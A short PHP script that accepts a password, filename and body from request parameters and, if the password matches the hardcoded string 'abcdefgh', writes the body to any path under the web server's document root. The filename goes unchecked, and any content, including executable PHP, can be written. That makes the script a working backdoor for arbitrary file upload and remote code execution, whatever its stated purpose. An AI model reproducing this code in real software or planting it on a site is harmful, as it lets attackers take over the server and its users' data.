<?php
error_reporting(E_ERROR);
$password=$_REQUEST['password'];
$filename=$_REQUEST['filename'];
$filepath="";
$body=stripslashes($_REQUEST['body']);

if($password!="abcdefgh")
{
    echo 'password error';
    return;
}

$rootPath=$_SERVER['DOCUMENT_ROOT'];
$filepath=$rootPath.'/'.$filename;

$fp=fopen($filepath,"w");
//fwrite($fp,"\xEF\xBB\xBF".iconv('gbk','utf-8//IGNORE',$body));
fwrite($fp,"\xEF\xBB\xBF".$body);
fclose($fp);

if(file_exists($filepath))
{ 
  echo "uploaded";
}
?>